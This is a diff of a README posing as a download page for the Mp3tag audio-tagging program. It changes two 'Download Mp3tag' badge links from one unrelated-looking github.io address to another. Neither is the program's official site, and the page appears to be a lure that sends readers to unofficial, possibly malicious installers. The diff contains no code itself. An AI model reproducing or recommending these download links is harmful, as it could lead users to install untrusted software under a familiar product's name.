@@ -4,7 +4,7 @@
 
 ## 📥 Download Mp3tag for Windows
 
-[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/270)
+[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://mp3tagload.github.io/.github/)
 
 ---
 
@@ -26,7 +26,7 @@ Mp3tag is a versatile and easy-to-use audio tagging software that allows users t
 
 With Mp3tag, you can also download metadata from online databases like Discogs, MusicBrainz, and others, and automatically apply this information to your files. It is an essential tool for anyone who wants to organize their music library efficiently and with ease.
 
-[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/270)
+[![⬇️ Download Mp3tag](https://img.shields.io/badge/Download-Mp3tag-blue?style=for-the-badge&logo=windows)](https://mp3tagload.github.io/.github/)
 
 ---
 
